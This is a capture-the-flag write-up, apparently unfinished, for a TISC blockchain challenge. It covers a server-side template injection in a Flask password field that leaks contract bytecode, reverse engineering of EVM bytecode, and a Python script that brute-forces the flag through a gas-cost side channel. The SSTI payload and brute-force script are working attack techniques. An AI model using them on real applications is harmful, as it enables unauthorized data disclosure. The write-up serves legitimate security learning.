NOTE: this writeup is still WIP

Similar to level 6, this is also a blockchain challenge, though with more emphasis on rev. Partial source is provided for this challenge:

![](/baby_flagchecker_tree.png)

# SSTI leak

There are 2 parts, the frontend web app and the backend where the private blockchain network is running. I quickly spotted the ssti vulnerability with the password field:

```python:main.py
@app.route('/submit', methods=['POST'])
def submit():
    password = request.form['password']
    try:
        if len(password) > 32:
            return render_template_string("""
        ... error message, html omitted for brevity ...
        """)

        response = requests.post("http://server:5000/check", json={"password": password})
        response_data = response.json()

        return render_template_string("""
        ... html omitted for brevity ...
            <body>
                <div class="container">
                    <p>Result for """ + password + """:</p>
                    {% if response_data["output"] %}
                    <h1>Accepted</h1>
                    {% else %}
                    <h1>Invalid</h1>
                    {% endif %}
                    <a href="/">Go back</a>
                </div>
            </body>
        </html>
        """, response_data=response_data)
    except Exception as e:
        return str(e)
```

Unfortunately, the 32 character length limit means we cannot get RCE. However, we can leak `response_data` with by passing password = `{{response_data}}`:

![](/response_data_leak.png)

# Backend server

On the backend there is a single POST endpoint:

```python:main.py
...

@app.post("/check")
async def check(password_input: PasswordInput):
    password = password_input.password

    try:
        web3_client = connect_to_anvil()
        setup_contract = init_setup_contract(web3_client)
        output_json = call_check_password(setup_contract, password)

        return output_json
    except RuntimeError as e:
        raise HTTPException(status_code=500, detail=str(e))
```

Essentially it connects to the private blockchain network and calls the `checkPassword` function on the Setup contract. The addresses of 2 other contracts are passed to Setup's constructor, so it probably calls some functions in them too.

Going back to the ssti leak, we now have the contract bytecode for 2 contracts: Setup and AdminPanel. I used an online solidity decompiler [https://ethervm.io/decompile](https://ethervm.io/decompile) which gave me a decompilation and disassembly.

# Reversing AdminPanel

AdminPanel was the first contract I reversed since it was shorter and easier to follow. The decompilation is suspiciously short:

```solidity
contract Contract {
    function main() {
        memory[returndata.length:returndata.length + 0x85] = code[0x09:0x8e];
        return memory[returndata.length:returndata.length + 0x85];
    }
}
```

But looking at the disassembly, we can see there is a lot more going on. It seems like the above code is just replacing the section of executable memory with more bytecode. This additional bytecode is found right after it, beginning with this section:

```plaintext
	0009    5F    5F // PUSH 0
	000A    35    CALLDATALOAD
	000B    80    DUP1
	000C    60    PUSH1 0xd8
	000E    1C    SHR
	000F    64    PUSH5 0x544953437b // "TISC{"
	0015    14    EQ
```

(Note: while reversing the assembly I refered to this [evm instruction set manual](https://www.ethervm.io/), a surprisingly comprehensive resource)

The above section loads the first 32 bytes of `msg.data` (basically arguments passed to the function), shifts right 27 bytes, and compares with "TISC{". So it just checks for the flag start.

```plaintext
	0016    81    DUP2 // msg.data[0:32]
	0017    60    PUSH1 0x80
	0019    1B    SHL
	001A    60    PUSH1 0xf8
	001C    1C    SHR
	001D    60    PUSH1 0x7d
	001F    14    EQ
```

The next section translates to `((msg.data[0:32] << 16 bytes) >> 31 bytes) == "}"` - checking the end of the flag. From this, we can also deduce the length of the flag - 17 characters.

This next section is slightly more tricky:

```plaintext
	0024    61    PUSH2 0x0022
	0027    57    *JUMPI
	0028    5F    5F
	0029    5F    5F
	002A    FD    *REVERT
	002B    5B    JUMPDEST
	002C    60    PUSH1 0x04
	002E    35    CALLDATALOAD
	002F    60    PUSH1 0x98
	0031    63    PUSH4 0x6b35340a
	0036    60    PUSH1 0x60
	0038    52    MSTORE
	0039    60    PUSH1 0x20  // length
	003B    60    PUSH1 0x60  // offset
	003D    20    SHA3
	003E    90    SWAP1
	003F    1B    SHL
	0040    18    XOR
```

It translates to `msg.data[4:36] ^ (keccak256(0x6b35340a) << 19 bytes)`. Let's move on to the next section.

```plaintext
	0041    60    PUSH1 0x24
	0043    35    CALLDATALOAD
	0044    63    PUSH4 0x66fbf07e
	0049    60    PUSH1 0x20
	004B    52    MSTORE
	004C    60    PUSH1 0x20
	004E    5F    5F
	004F    60    PUSH1 0x04
	0051    60    PUSH1 0x3c
	0053    84    DUP5
	0054    5A    GAS
	0055    F4    DELEGATECALL
```

This is performing some function call, and after consulting the aforementioned ISA manual I realised it is calling the function at address `msg.data[0x24:0x44]`, with arguments `memory[0x3c:0x3c+4]`. The return value is stored at `memory[0:0x20]`. Later on, I realised that the first 4 bytes in the argument are used as a "selector", which identifies which function in the contract to call. Here's an example from [this article](https://medium.com/@eiki1212/explaining-ethereum-contract-abi-evm-bytecode-6afa6e917c3b)

```plaintext
// Encode function with keccak256.
> web3.utils.sha3(“withdraw(uint256)”)
0x2e1a7d4d13322e7b96f9a57413e1525c250fb7a9021cf91d1540d5b69f16a49f
// Extract first 4 bytes.
0x2c1a7d4d
```

So it's basically doing something like `mystery_contract.function()`, with the address of `mystery_contract` being stored at `memory[0x24:0x44]`.

Additionally, this means that `msg.data[0:4` = "TISC" is the selector for this contract function. So the user input should just be the `{...}` part.

The next section is a bit long winded, but after tracking how the stack changes I realised it's just comparing the output of `msg.data[4:36] ^ (keccak256(0x6b35340a) << 19 bytes)` to `mystery_contract.function()`. It checks that they have 0xd = 13 equal bytes, and returns 0 or 1 based on that. Here it is:

```plaintext
	0057    5F    5F
	0058    51    MLOAD
	0059    5F    5F
	005A    5F    5F
	005B    5B    JUMPDEST
	005C    82    DUP3
	005D    82    DUP3
	005E    1A    BYTE
	005F    85    DUP6
	0060    83    DUP4
	0061    1A    BYTE
	0062    14    EQ
	0063    61    PUSH2 0x0070
	0066    57    *JUMPI
	0067    5B    JUMPDEST
	0068    90    SWAP1
	0069    60    PUSH1 0x01
	006B    01    ADD
	006C    80    DUP1
	006D    60    PUSH1 0x0d
	006F    14    EQ
	0070    61    PUSH2 0x0078
	0073    57    *JUMPI
	0074    90    SWAP1
	0075    61    PUSH2 0x0052
	0078    56    *JUMP
	0079    5B    JUMPDEST
	007A    60    PUSH1 0x01
	007C    01    ADD
	007D    61    PUSH2 0x005e
	0080    56    *JUMP
	0081    5B    JUMPDEST
	0082    81    DUP2
	0083    60    PUSH1 0x0d
	0085    14    EQ
	0086    60    PUSH1 0x40
	0088    52    MSTORE
	0089    60    PUSH1 0x20
	008B    60    PUSH1 0x40
	008D    F3    *RETURN
```

Since we don't have access to the `mystery_contract` bytecode (also, it's reasonable to guess that `mystery_contract` is the Secret contract), we have to continue reversing.

# Reversing Setup

When I decompiled Setup on ethervm.io, it helpfully informed me that the decompilation was probably constructor bytecode and to get the actual deployed contract I would have to "remove the constructor prefix, usually up to the next 6060 or 6080". I did so, and got the decompilation:

```solidity
contract Contract {
    function main() {
        memory[0x40:0x60] = 0x80;
        var var0 = msg.value;
    
        if (var0) { revert(memory[0x00:0x00]); }
    
        if (msg.data.length < 0x04) { revert(memory[0x00:0x00]); }
    
        var0 = msg.data[0x00:0x20] >> 0xe0;
    
        if (var0 != 0x410eee02) { revert(memory[0x00:0x00]); }
    
        var var1 = 0x0043;
        var var2 = 0x003e;
        var var3 = msg.data.length;
        var var4 = 0x04;
        var2 = func_0115(var3, var4);
        var1 = func_003E(var2);
        var temp0 = memory[0x40:0x60];
        memory[temp0:temp0 + 0x20] = !!var1;
        var temp1 = memory[0x40:0x60];
        return memory[temp1:temp1 + (temp0 + 0x20) - temp1];
    }
    
    function func_003E(var arg0) returns (var r0) {
        var var0 = 0x00;
        var temp0 = memory[0x40:0x60];
        memory[temp0 + 0x24:temp0 + 0x24 + 0x20] = arg0;
        var temp1 = (0x01 << 0xa0) - 0x01;
        memory[temp0 + 0x44:temp0 + 0x44 + 0x20] = temp1 & storage[0x01];
        var temp2 = memory[0x40:0x60];
        memory[temp2:temp2 + 0x20] = temp0 - temp2 + 0x44;
        memory[0x40:0x60] = temp0 + 0x64;
        var temp3 = temp2 + 0x20;
        memory[temp3:temp3 + 0x20] = (memory[temp3:temp3 + 0x20] & (0x01 << 0xe0) - 0x01) | (0x54495343 << 0xe0);
        var var1 = var0;
        var var2 = var1;
        var var3 = temp1 & storage[var2];
        var var5 = temp2;
        var var6 = memory[0x40:0x60];
        var var4 = 0x00b9;
        var4 = func_012E(var5, var6);
        var temp4 = memory[0x40:0x60];
        var temp5;
        temp5, memory[temp4:temp4 + 0x00] = address(var3).call.gas(msg.gas)(memory[temp4:temp4 + var4 - temp4]);
        var4 = returndata.length;
        var5 = var4;
    
        if (var5 == 0x00) {
            var2 = 0x60;
            var1 = var3;
            var3 = 0x010a;
            var4 = var2;
            var3 = func_015D(var4);
        
        label_010A:
            return var3 == 0x01;
        } else {
            var temp6 = memory[0x40:0x60];
            var4 = temp6;
            memory[0x40:0x60] = var4 + (returndata.length + 0x3f & ~0x1f);
            memory[var4:var4 + 0x20] = returndata.length;
            var temp7 = returndata.length;
            memory[var4 + 0x20:var4 + 0x20 + temp7] = returndata[0x00:0x00 + temp7];
            var2 = var4;
            var1 = var3;
            var3 = 0x010a;
            var4 = var2;
            var3 = func_015D(var4);
            goto label_010A;
        }
    }
    
    function func_0115(var arg0, var arg1) returns (var r0) {
        var var0 = 0x00;
    
        if (arg0 - arg1 i>= 0x20) { return msg.data[arg1:arg1 + 0x20]; }
        else { revert(memory[0x00:0x00]); }
    }
    
    function func_012E(var arg0, var arg1) returns (var r0) {
        var var0 = 0x00;
        var var1 = memory[arg0:arg0 + 0x20];
        var var2 = 0x00;
    
        if (var2 >= var1) {
        label_014F:
            memory[arg1 + var1:arg1 + var1 + 0x20] = 0x00;
            return arg1 + var1;
        } else {
        label_013E:
            var temp0 = var2;
            memory[temp0 + arg1:temp0 + arg1 + 0x20] = memory[arg0 + temp0 + 0x20:arg0 + temp0 + 0x20 + 0x20];
            var2 = temp0 + 0x20;
        
            if (var2 >= var1) { goto label_014F; }
            else { goto label_013E; }
        }
    }
    
    function func_015D(var arg0) returns (var r0) {
        var temp0 = arg0;
        var var0 = memory[temp0 + 0x20:temp0 + 0x20 + 0x20];
        var var1 = memory[temp0:temp0 + 0x20];
    
        if (var1 >= 0x20) { return var0; }
        else { return var0 & (~0x00 << (0x20 - var1 << 0x03)); }
    }
}
```

I also went down a mini rabbit hole looking at the suspicious instructions near the end of the contract:

```plaintext
0184    FE    *ASSERT
	0185    A2    LOG2
	0186    64    PUSH5 0x6970667358
	018C    22    22
	018D    12    SLT
	018E    20    SHA3
	018F    E0    E0
	0190    F8    F8
	0191    33    CALLER
	0192    3B    EXTCODESIZE
	0193    E0    E0
	0194    83    DUP4
	0195    B8    B8
	0196    07    SMOD
	0197    F8    F8
	0198    95    SWAP6
	0199    1D    SAR
	019A    48    BASEFEE
	019B    68    PUSH9 0xa6231b41254b2f6157
	01A5    A9    A9
	01A6    FB    FB
	01A7    62    PUSH3 0xeff1bc
	01AB    EF    EF
	01AC    AF    AF
	01AD    D8    D8
	01AE    4E    4E
	01AF    64    PUSH5 0x736f6c6343
	01B5    00    *STOP
	01B6    08    ADDMOD
	01B7    13    SGT
	01B8    00    *STOP
	01B9    33    CALLER
```

I saw some ascii text and thought this might be important to the challenge. But eventually I came across [this stackexchange post](https://ethereum.stackexchange.com/questions/23525/what-is-the-cryptic-part-at-the-end-of-a-solidity-contract-bytecode) and realised it was just some metadata not relevant to the challenge.

* look at decompilation of Setup contract
	* calls a function on another contract that I assume is the function in AdminPanel contract
* after many unsuccessful attempts, return to web stuff
* realised that the `gas` value is provided
* recall from previous googling that each opcode has a certain gas cost, hence total gas cost of a transaction is calculated based on what opcodes are executed
* we can use `gas` as an oracle (more opcodes are executed for success path, when flag check fails it ends early)
* write python script:

```
{'output': False, 'setup_contract_address': '0x9fE46736679d2D9a65F0992F2272dE9f3c7fa6e0', 'setup_contract_bytecode': '0x608060405234801561001057600080fd5b5060405161027838038061027883398101604081905261002f9161007c565b600080546001600160a01b039384166001600160a01b031991821617909155600180549290931691161790556100af565b80516001600160a01b038116811461007757600080fd5b919050565b6000806040838503121561008f57600080fd5b61009883610060565b91506100a660208401610060565b90509250929050565b6101ba806100be6000396000f3fe608060405234801561001057600080fd5b506004361061002b5760003560e01c8063410eee0214610030575b600080fd5b61004361003e366004610115565b610057565b604051901515815260200160405180910390f35b6000805460015460408051602481018690526001600160a01b0392831660448083019190915282518083039091018152606490910182526020810180516001600160e01b0316635449534360e01b17905290518493849316916100b99161012e565b6000604051808303816000865af19150503d80600081146100f6576040519150601f19603f3d011682016040523d82523d6000602084013e6100fb565b606091505b50915091508061010a9061015d565b600114949350505050565b60006020828403121561012757600080fd5b5035919050565b6000825160005b8181101561014f5760208186018101518583015201610135565b506000920191825250919050565b8051602080830151919081101561017e576000198160200360031b1b821691505b5091905056fea2646970667358221220e0f8333be083b807f8951d4868a6231b41254b2f6157a9fb62eff1bcefafd84e64736f6c63430008130033', 'adminpanel_contract_bytecode': '0x60858060093d393df35f358060d81c64544953437b148160801b60f81c607d1401600214610022575f5ffd5b6004356098636b35340a6060526020606020901b186024356366fbf07e60205260205f6004603c845af4505f515f5f5b82821a85831a14610070575b9060010180600d146100785790610052565b60010161005e565b81600d1460405260206040f3', 'secret_contract_bytecode': '0xREDACTED', 'gas': 29283}:
```

```python:s.py
import requests
from string import printable

template = list('{XXXXXXXXXXX}' + '{{response_data}}')

space = set(printable).difference('#{}%')

for x in range(1, 12):
    for c in space:
        payload = template[:]
        payload[x] = c
        resp = requests.post('http://chals.tisc24.ctf.sg:52416/submit',
                             data={'password': ''.join(payload)})
        search_for = "&#39;gas&#39;: "
        try:
            i = resp.text.index(search_for) + len(search_for)
            j = resp.text.index('}', i)
            gas = int(resp.text[i:j])
            if gas >= 33377:
                print(c, end='', flush=True)
                break
        except:
            print(resp.text)
            import sys
            sys.exit(1)
```

my notes (a bit disorganised) for setup contract reversing

```plaintext:setup.notes.txt
# 0x10A: A | B | C | D | E | val
    -> val == 1, $pc=A
# 0x127: A | B | C | D
    -> msg.data[C], $pc=A
# 0x14F: A | B | C | D | E | F
    -> E+C, $pc=A, memory[E+C]=0
# 0x17E: A | B | C | D
    -> C, $pc=A

unknown, 0, storage[0], (1 << 0xa0) - 1, 0, memory[0x40], 0
- 'stack base ptr' at memory[0x40], 32 bytes
- base[0x24] = arg0
- base[0x44] = storage[1] & ((1 << 0xa0) - 1) # mask last 20 bytes of storage
- base[0] = 0x44
- base[0x20] = base[0x20] & ((1 << 0xe0) - 1) | b'TISC'  # replace first 4 bytes with TISC
- storage[0] & ((1 << 0xa0) - 1)
- addr = func_012E(base, base+0x64)
- address(storage[0] & ((1 << 0xa0) - 1)).call(memory[base+0x64:base+0x64+0x44]) 

- storage[0] should be address of AdminPanel contract
- storage[1] should be address of Secret contract

# func_012E
- number = memory[base] (should be 0x44)
- i
while (true) {
  if (i >= number) {
    memory[base + 0x64 + number] = 0
    return base + 0x64 + number;
  }
  memory[base + 0x64 + i] = memory[base + i + 0x20] # copy 0x20 sized chunk
  i += 0x20
}
```

notes for adminpanel reverse:

```plaintext:adminpanel.notes.txt
- check that starts with `TISC{` and ends with `}`
- `Secret.getSecret() == user_input[4:] ^ (keccak256(0x6b35340a) << 0x98)`

all the following are in uint256 words (i.e. memory[0x60] means memory[0x60:0x60+0x20])
- memory[0x60] = 0x6b35340a
- memory[0x20] = 0x66fbf07e // parameter passed to secret call (the selector). Probably a getsecret function
- memory[0x40] = 0x1 if passes check else 0x0
- memory[0x0] = return value of secret call
```
